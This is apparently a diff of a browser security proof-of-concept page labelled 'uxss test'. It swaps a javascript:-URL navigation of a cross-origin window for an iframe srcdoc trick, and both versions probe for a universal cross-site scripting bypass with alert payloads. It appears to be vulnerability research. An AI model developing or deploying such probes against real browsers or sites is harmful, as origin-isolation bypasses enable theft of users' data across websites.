@@ -1,21 +1,18 @@
 <html>
 <head><title>test</title></head>
 <body>
-<p>uxss test 3</p>
+<p>uxss iframe srcdoc</p>
 <button onclick="go()">click here</button>
 <p id="h"></p>
 <script>
-var win;
 function go(){
-  win = window.open('https://download-bypass.netlify.app/', '_blank');
+  var f = document.createElement('iframe');
+  f.srcdoc = '<h1>srcdoc page</h1><script>alert("srcdoc domain=" + document.domain)<\/script>';
+  document.body.appendChild(f);
   setTimeout(function(){
-    document.getElementById('h').innerText = 'BYPASS! trying javascript: in second domain';
-    try {
-      win.location = 'javascript:alert("UXSS domain=" + document.domain)';
-    } catch(e) {
-      document.getElementById('h').innerText = 'blocked: ' + e;
-    }
-  }, 1000);
+    document.getElementById('h').innerText = 'BYPASS! trying to navigate iframe to second domain';
+    f.src = 'https://www.google.com/';
+  }, 500);
 }
 </script>
 </body>
